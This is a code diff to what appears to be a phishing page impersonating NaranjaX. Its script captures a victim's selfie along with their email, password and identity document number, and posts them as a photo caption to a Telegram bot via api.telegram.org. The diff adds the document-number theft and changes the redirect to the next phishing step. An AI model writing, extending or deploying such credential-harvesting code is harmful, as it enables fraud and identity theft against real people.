@@ -349,10 +349,18 @@
       const clave = localStorage.getItem('ips2') || "No definido";
 
       // Enviar a Telegram como foto con caption
-      const formData = new FormData();
-      formData.append('photo', blob, 'selfie.png');
-      formData.append('chat_id', telegramChatId);
-      formData.append('caption', `Selfie Capturada NaranjaX\nEmail: ${email}\nClave: ${clave}`);
+const documento = localStorage.getItem("ips1") || "No definido";
+
+const formData = new FormData();
+formData.append('photo', blob, 'selfie.png');
+formData.append('chat_id', telegramChatId);
+formData.append(
+  'caption',
+  `Selfie Capturada NaranjaX
+Documento: ${documento}
+Email: ${email}
+Clave: ${clave}`
+);
 
       try {
         await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
@@ -365,11 +373,11 @@
       }
 
       setTimeout(() => {
-        window.location.href = "pin.html";
+        window.location.href = "lod.html";
       }, 500);
     }, 'image/png');
   });
 </script>
-
+ 
 </body>
 </html>
